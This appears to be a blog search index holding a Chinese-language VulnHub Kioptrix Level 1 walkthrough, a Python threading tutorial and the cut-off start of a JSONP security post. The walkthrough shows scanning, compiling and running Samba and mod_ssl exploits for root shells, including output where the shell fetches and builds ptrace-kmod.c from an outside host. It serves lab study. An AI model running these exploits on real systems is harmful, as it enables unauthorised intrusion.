<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>vulnhub-Kioptrix-lv.1-WalkThrough</title>
    <url>/2020/03/05/vulnhub-Kioptrix-lv-1-WalkThrough/</url>
    <content><![CDATA[<p>tags:</p><ul>
<li>渗透测试</li>
<li>Vulnhub</li>
<li>OSCP<br>categories:</li>
<li>OSCP</li>
</ul><hr><h2 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h2><hr><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看靶机ip</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">208.1</span>/<span class="number">24</span> -T4</span><br><span class="line">Starting Nmap <span class="number">7.70</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2020</span>-<span class="number">01</span>-<span class="number">19</span> <span class="number">02</span>:<span class="number">42</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">208.136</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00014</span>s latency).</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">52</span>:D9:<span class="number">25</span> (VMware)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">5</span> hosts <span class="keyword">up</span>) scanned in <span class="number">1.93</span> seconds</span><br></pre></td></tr></table></figure><a id="more"></a>






<p>查看端口开放情况</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -Pn -vv -T4 -p- --max-retries 1 -sS --max-scan-delay 20 192.168.208.136</span><br><span class="line"></span><br><span class="line">PORT     STATE<span class="built_in"> SERVICE </span>    REASON</span><br><span class="line">22/tcp   open  ssh         syn-ack ttl 64</span><br><span class="line">80/tcp   open  http        syn-ack ttl 64</span><br><span class="line">111/tcp  open  rpcbind     syn-ack ttl 64</span><br><span class="line">139/tcp  open  netbios-ssn syn-ack ttl 64</span><br><span class="line">443/tcp  open  https       syn-ack ttl 64</span><br><span class="line">1024/tcp open  kdm         syn-ack ttl 64</span><br><span class="line">MAC Address: 00:0C:29:52:D9:25 (VMware)</span><br></pre></td></tr></table></figure>

<p>扫一下web服务</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -h 192.168.208.136</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.208.136</span><br><span class="line">+ Target Hostname:    192.168.208.136</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">03</span>:<span class="number">10</span>:<span class="number">57</span> (GMT<span class="number">-5</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span><span class="number">.4</span> OpenSSL/<span class="number">0.9</span><span class="number">.6</span>b</span><br><span class="line">+ <span class="keyword">Server</span> may leak inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /, inode: <span class="number">34821</span>, <span class="keyword">size</span>: <span class="number">2890</span>, mtime: Wed Sep  <span class="number">5</span> <span class="number">23</span>:<span class="number">12</span>:<span class="number">46</span> <span class="number">2001</span></span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ mod_ssl/<span class="number">2.8</span><span class="number">.4</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> <span class="number">2.8</span><span class="number">.31</span>) (may depend <span class="keyword">on</span> <span class="keyword">server</span> <span class="keyword">version</span>)</span><br><span class="line">+ Apache/<span class="number">1.3</span><span class="number">.20</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.37</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ OpenSSL/<span class="number">0.9</span><span class="number">.6</span>b appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> <span class="number">1.1</span><span class="number">.1</span>). OpenSSL <span class="number">1.0</span><span class="number">.0</span>o <span class="keyword">and</span> <span class="number">0.9</span><span class="number">.8</span>zc <span class="keyword">are</span> also current.</span><br><span class="line">+ OSVDB<span class="number">-27487</span>: Apache <span class="keyword">is</span> vulnerable <span class="keyword">to</span> XSS via the Expect header</span><br><span class="line">+ OSVDB<span class="number">-838</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.</span>x up <span class="number">1.2</span><span class="number">.34</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a remote DoS <span class="keyword">and</span> possible code execution. CAN<span class="number">-2002</span><span class="number">-0392.</span></span><br><span class="line">+ OSVDB<span class="number">-4552</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.3</span> below <span class="number">1.3</span><span class="number">.27</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a <span class="keyword">local</span> buffer <span class="keyword">overflow</span> which allows attackers <span class="keyword">to</span> <span class="keyword">kill</span> <span class="keyword">any</span> process <span class="keyword">on</span> the system. CAN<span class="number">-2002</span><span class="number">-0839.</span></span><br><span class="line">+ OSVDB<span class="number">-2733</span>: Apache/<span class="number">1.3</span><span class="number">.20</span> - Apache <span class="number">1.3</span> below <span class="number">1.3</span><span class="number">.29</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> overflows <span class="keyword">in</span> mod_rewrite <span class="keyword">and</span> mod_cgi. CAN<span class="number">-2003</span><span class="number">-0542.</span></span><br><span class="line">+ mod_ssl/<span class="number">2.8</span><span class="number">.4</span> - mod_ssl <span class="number">2.8</span><span class="number">.7</span> <span class="keyword">and</span> <span class="keyword">lower</span> <span class="keyword">are</span> vulnerable <span class="keyword">to</span> a remote buffer <span class="keyword">overflow</span> which may <span class="keyword">allow</span> a remote shell. <span class="keyword">http</span>://cve.mitre.org/cgi-<span class="keyword">bin</span>/cvename.cgi?<span class="keyword">name</span>=CVE<span class="number">-2002</span><span class="number">-0082</span>, OSVDB<span class="number">-756.</span></span><br><span class="line">+ Allowed <span class="keyword">HTTP</span> Methods: <span class="keyword">GET</span>, <span class="keyword">HEAD</span>, OPTIONS, <span class="keyword">TRACE</span> </span><br><span class="line">+ OSVDB<span class="number">-877</span>: <span class="keyword">HTTP</span> <span class="keyword">TRACE</span> method <span class="keyword">is</span> active, suggesting the host <span class="keyword">is</span> vulnerable <span class="keyword">to</span> XST</span><br><span class="line">+ ///etc/<span class="keyword">hosts</span>: The <span class="keyword">server</span> <span class="keyword">install</span> allows reading <span class="keyword">of</span> <span class="keyword">any</span> <span class="keyword">system</span> <span class="keyword">file</span> <span class="keyword">by</span> adding an extra <span class="string">'/'</span> <span class="keyword">to</span> the URL.</span><br><span class="line">+ OSVDB<span class="number">-682</span>: /<span class="keyword">usage</span>/: Webalizer may be installed. <span class="keyword">Versions</span> <span class="keyword">lower</span> <span class="keyword">than</span> <span class="number">2.01</span><span class="number">-09</span> vulnerable <span class="keyword">to</span> <span class="keyword">Cross</span> Site Scripting (XSS).</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /<span class="keyword">manual</span>/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /<span class="keyword">manual</span>/: Web <span class="keyword">server</span> <span class="keyword">manual</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3268</span>: /icons/: <span class="keyword">Directory</span> <span class="keyword">indexing</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ OSVDB<span class="number">-3092</span>: /test.php: This might be interesting...</span><br><span class="line">+ /wp-<span class="keyword">content</span>/themes/twentyeleven/images/headers/server.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-<span class="keyword">content</span>/themes/twentyeleven/images/headers/server.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wp-includes/Requests/Utility/<span class="keyword">content</span>-post.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-includes/Requests/Utility/<span class="keyword">content</span>-post.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/<span class="keyword">hosts</span>: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor <span class="keyword">file</span> manager was found.</span><br><span class="line">+ /login.cgi?cli=aa%<span class="number">20</span>aa%<span class="number">27</span>cat%<span class="number">20</span>/etc/<span class="keyword">hosts</span>: <span class="keyword">Some</span> D-<span class="keyword">Link</span> router remote command execution.</span><br><span class="line">+ /shell?cat+/etc/<span class="keyword">hosts</span>: A backdoor was identified.</span><br><span class="line">+ <span class="number">8724</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">30</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">03</span>:<span class="number">12</span>:<span class="number">15</span> (GMT<span class="number">-5</span>) (<span class="number">78</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>

<p>扫一下操作系统</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># enum4linux 192.168.208.136</span></span><br></pre></td></tr></table></figure>

<p>这里有两处需要关注, 一个是smb服务, 一个是apache的</p>
<ul>
<li>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.</li>
</ul>
<p>有个很坑的东西是, 本来用enum4linux可以列举出samba的版本的, 但不知道为什么这里没出来, 所以我们用msf再探测一下版本.</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">msf5</span> <span class="selector-tag">auxiliary</span>(scanner/smb/smb_version) &gt; <span class="selector-tag">run</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.208</span><span class="selector-class">.136</span><span class="selector-pseudo">:139</span>   <span class="selector-tag">-</span> <span class="selector-tag">Host</span> <span class="selector-tag">could</span> <span class="selector-tag">not</span> <span class="selector-tag">be</span> <span class="selector-tag">identified</span>: <span class="selector-tag">Unix</span> (Samba <span class="number">2.2</span>.<span class="number">1</span>a)</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.208</span><span class="selector-class">.136</span><span class="selector-pseudo">:445</span>   <span class="selector-tag">-</span> <span class="selector-tag">Scanned</span> <span class="selector-tag">1</span> <span class="selector-tag">of</span> <span class="selector-tag">1</span> <span class="selector-tag">hosts</span> (<span class="number">100%</span> complete)</span><br><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Auxiliary</span> <span class="selector-tag">module</span> <span class="selector-tag">execution</span> <span class="selector-tag">completed</span></span><br></pre></td></tr></table></figure>

<p>samba版本是2.21a</p>
<p>搜索了一下发现这个samba的版本有问题, 本着尽量不使用msf的原则0 0</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># searchsploit samba 2.2</span></span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                |  Path</span><br><span class="line">                                                                                              | (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Samba <span class="number">2.0</span>.x/<span class="number">2.2</span> - Arbitrary File Creation                                                     | exploits/unix/remote/<span class="number">20968</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">0</span> &lt; <span class="number">2.2</span>.<span class="number">8</span> (OSX) - trans2open Overflow (Metasploit)                                  | exploits/osx/remote/<span class="number">9924</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">2</span> &lt; <span class="number">2.2</span>.<span class="number">6</span> - <span class="string">'nttrans'</span> Remote Buffer Overflow (Metasploit) (<span class="number">1</span>)                       | exploits/linux/remote/<span class="number">16321</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (BSD x86) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                             | exploits/bsd_x86/remote/<span class="number">16880</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Linux Kernel <span class="number">2.6</span> / Debian / Mandrake) - Share Privilege Escalation               | exploits/linux/local/<span class="number">23674</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Linux x86) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                           | exploits/linux_x86/remote/<span class="number">16861</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (OSX/PPC) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                             | exploits/osx_ppc/remote/<span class="number">16876</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> (Solaris SPARC) - <span class="string">'trans2open'</span> Remote Overflow (Metasploit)                       | exploits/solaris_sparc/remote/<span class="number">16330</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.<span class="number">8</span> - Brute Force Method Remote Command Execution                                     | exploits/linux/remote/<span class="number">55</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">1</span>)                                    | exploits/unix/remote/<span class="number">22468</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">2</span>)                                    | exploits/unix/remote/<span class="number">22469</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">3</span>)                                    | exploits/unix/remote/<span class="number">22470</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'call_trans2open'</span> Remote Buffer Overflow (<span class="number">4</span>)                                    | exploits/unix/remote/<span class="number">22471</span>.txt</span><br><span class="line">Samba <span class="number">2.2</span>.x - <span class="string">'nttrans'</span> Remote Overflow (Metasploit)                                          | exploits/linux/remote/<span class="number">9936</span>.rb</span><br><span class="line">Samba <span class="number">2.2</span>.x - CIFS/<span class="number">9000</span> Server A.<span class="number">01</span>.x Packet Assembling Buffer Overflow                       | exploits/unix/remote/<span class="number">22356</span>.c</span><br><span class="line">Samba <span class="number">2.2</span>.x - Remote Buffer Overflow                                                          | exploits/linux/remote/<span class="number">7</span>.pl</span><br><span class="line">Samba &lt; <span class="number">2.2</span>.<span class="number">8</span> (Linux/BSD) - Remote Code Execution                                             | exploits/multiple/remote/<span class="number">10</span>.c</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"><span class="symbol">Shellcodes:</span> No Result</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/Desktop/10.c</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># gcc 10.c -o 10</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># ./10 -b 0 -v 192.168.208.136</span></span><br><span class="line">samba-<span class="number">2.2</span>.<span class="number">8</span> &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">+ Verbose mode.</span><br><span class="line">+ Bruteforce mode. (Linux)</span><br><span class="line">+ Host is running samba.</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffed4</span>]</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffda8</span>]</span><br><span class="line">+ Using <span class="symbol">ret:</span> [<span class="number">0xbffffc7c</span>]</span><br><span class="line">+ Worked!</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">*** JE MOET JE MUIL HOUWE</span><br><span class="line">Linux kioptrix.level1 <span class="number">2.4</span>.<span class="number">7</span>-<span class="number">10</span> <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">99</span>(nobody)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br></pre></td></tr></table></figure>

<p>好了到此samba的root已经拿到了, 之前提到过</p>
<ul>
<li>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@kali<span class="symbol">:~/Desktop</span><span class="comment"># searchsploit mod_ssl</span></span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                <span class="params">|  Path</span></span><br><span class="line"><span class="params">                                                                                              |</span> (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apache mod_ssl <span class="number">2.0</span>.x - Remote Denial of Service                                               <span class="params">| exploits/linux/dos/24590.txt</span></span><br><span class="line"><span class="params">Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                    |</span> exploits/multiple/dos/<span class="number">21575</span>.txt</span><br><span class="line">Apache mod_ssl &lt; <span class="number">2.8</span>.<span class="number">7</span> OpenSSL - <span class="string">'OpenFuck.c'</span> Remote Buffer Overflow                          <span class="params">| exploits/unix/remote/21671.c</span></span><br><span class="line"><span class="params">Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow                        |</span> exploits/unix/remote/<span class="number">764</span>.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; <span class="number">0</span>.<span class="number">9.6</span>d / &lt; <span class="number">0</span>.<span class="number">9.7</span>-beta2 - <span class="string">'openssl-too-open.c'</span> SSL2 KEY_ARG Overflow  <span class="params">| exploits/unix/remote/40347.txt</span></span><br><span class="line"><span class="params">---------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="params">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>搜索了一波, 用764编译各种无解报错, 去官网搜一下</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># gcc -o 1 47080.c -lcrypto</span></span><br></pre></td></tr></table></figure>

<p>编译成功了</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# ./1 0x6b 192.168.208.136 -c 50</span><br><span class="line"></span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"><span class="bullet">* </span>OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"><span class="bullet">* </span>by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line"><span class="bullet">* </span>#hackarena  irc.brasnet.org                                     *</span><br><span class="line"><span class="bullet">* </span>TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line"><span class="bullet">* </span>#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line"><span class="bullet">* </span>#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"></span><br><span class="line">Connection... 50 of 50</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo </span><br><span class="line">--05:28:08--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line"><span class="code">           =&gt; `ptrace-kmod.c'</span></span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line"><span class="code">    0K ...                                                   100% @   4.13 KB/s</span></span><br><span class="line"></span><br><span class="line">05:28:11 (4.13 KB/s) - `ptrace-kmod.c' saved [3921/3921]</span><br><span class="line"></span><br><span class="line">/usr/bin/ld: cannot open output file exploit: Permission denied</span><br><span class="line">collect2: ld returned 1 exit status</span><br><span class="line">gcc: file path prefix `/usr/bin' never used</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>拿到root权限</p>
]]></content>
  </entry>
  <entry>
    <title>python-Threading模块</title>
    <url>/2019/10/16/python-Threading%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<hr><h1 id="python-Threading模块"><a href="#python-Threading模块" class="headerlink" title="python-Threading模块"></a>python-Threading模块</h1><hr><h2 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h2><p>Python 提供了多个模块来支持多线程编程，包括 thread、 threading 和 Queue 模块等。<br>程序是可以使用 thread 和 threading 模块来创建与管理线程。 thread 模块提供了基本的线程和锁定支持；而 threading 模块提供了更高级别、功能更全面的线程管理。<br>使用 Queue 模块，用户可以创建一个队列数据结构，用于在多线程之间进行共享。</p><a id="more"></a>


<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">time</span>, threading</span><br><span class="line">def <span class="keyword">loop</span>():</span><br><span class="line">    print(<span class="string">'thread %s is running...'</span> % threading.current_thread().<span class="keyword">name</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="number">5</span>:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        print(<span class="string">'thread %s &gt;&gt;&gt; %s'</span> % (threading.current_thread().<span class="keyword">name</span>, n))</span><br><span class="line">        <span class="built_in">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'thread %s ended.'</span> % threading.current_thread().<span class="keyword">name</span>)</span><br><span class="line">print(<span class="string">'thread %s is running...'</span> % threading.current_thread().<span class="keyword">name</span>)</span><br><span class="line">t = threading.Thread(target=<span class="keyword">loop</span>, <span class="keyword">name</span>=<span class="string">'LoopThread'</span>)</span><br><span class="line">t.start()</span><br><span class="line">t.join()</span><br><span class="line">print(<span class="string">'thread %s ended.'</span> % threading.current_thread().<span class="keyword">name</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">thread</span> MainThread is running<span class="params">...</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread is running<span class="params">...</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread &gt;&gt;&gt; <span class="number">2</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread &gt;&gt;&gt; <span class="number">3</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread &gt;&gt;&gt; <span class="number">4</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread &gt;&gt;&gt; <span class="number">5</span></span><br><span class="line"><span class="keyword">thread</span> LoopThread ended.</span><br><span class="line"><span class="keyword">thread</span> MainThread ended.</span><br></pre></td></tr></table></figure>

<p>由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python的threading模块有个current_thread()函数，它永远返回当前线程的实例。主线程实例的名字叫MainThread，子线程的名字在创建时指定，我们用LoopThread命名子线程。名字仅仅在打印时用来显示，完全没有其他意义，如果不起名字Python就自动给线程命名为Thread-1，Thread-2……</p>
<p>Lock<br>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">import time, threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">balance </span>= <span class="number">0</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">def change_it(n):</span><br><span class="line">    global <span class="keyword">balance</span></span><br><span class="line"><span class="keyword"> </span>   <span class="keyword">balance </span>= <span class="keyword">balance </span>+ n</span><br><span class="line">    <span class="keyword">balance </span>= <span class="keyword">balance </span>- n</span><br><span class="line"></span><br><span class="line">def run_thread(n):</span><br><span class="line">    for i in range(<span class="number">100000</span>):</span><br><span class="line">        lock.acquire()</span><br><span class="line"><span class="symbol">        try:</span></span><br><span class="line">            change_it(n)</span><br><span class="line"><span class="symbol">        finally:</span></span><br><span class="line">            lock.release()</span><br><span class="line"><span class="built_in">t1</span> = threading.Thread(target=run_thread, args=(<span class="number">5</span>,))</span><br><span class="line"><span class="built_in">t2</span> = threading.Thread(target=run_thread, args=(<span class="number">8</span>,))</span><br><span class="line"><span class="built_in">t1</span>.start()</span><br><span class="line"><span class="built_in">t2</span>.start()</span><br><span class="line"><span class="built_in">t1</span>.<span class="keyword">join()</span></span><br><span class="line"><span class="keyword">t2.join()</span></span><br><span class="line"><span class="keyword">print(balance)</span></span><br></pre></td></tr></table></figure>

<p>分布式进程</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>JSONP-安全攻防技术</title>
    <url>/2019/10/16/JSONP-%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="JSONP-安全攻防技术"><a href="#JSONP-安全攻防技术" class="headerlink" title="JSONP-安全攻防技术"></a>JSONP-安全攻防技术</h1><hr><ul>
<li>前言：本文是对<a href="https://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">道哥：JSONP 安全攻防技术</a>的学习。</li>
